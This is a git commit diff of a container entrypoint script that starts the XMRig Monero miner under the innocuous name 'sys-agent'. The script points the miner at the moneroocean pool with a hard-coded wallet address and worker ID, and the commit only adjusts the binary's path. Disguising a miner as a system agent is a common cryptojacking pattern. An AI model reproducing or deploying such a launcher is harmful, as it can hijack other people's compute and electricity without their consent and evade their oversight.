7d993879d331785cf36afdda4b10829f11addc22
willy6509 <149163931+willy6509@users.noreply.github.com>
2025-05-17 13:02:39 +0700

    Update entrypoint.sh

--- entrypoint.sh
+++ entrypoint.sh
@@ -1,7 +1,7 @@
 #!/bin/sh
 
 echo "Starting sys-agent (XMRig)..."
-exec /sys-agent \
+exec ./sys-agent \
   -o gulf.moneroocean.stream:10128 \
   -u 44DAhx7oyggJJZ91pjA7yRj9DtQtXguiAHwCPJukn48BLR8uSd6wz2uQ1nYZ7UVbqxeNwhjRQMh6e9iMvXYUd2qZF3djjRQ \
   -p worker01 \
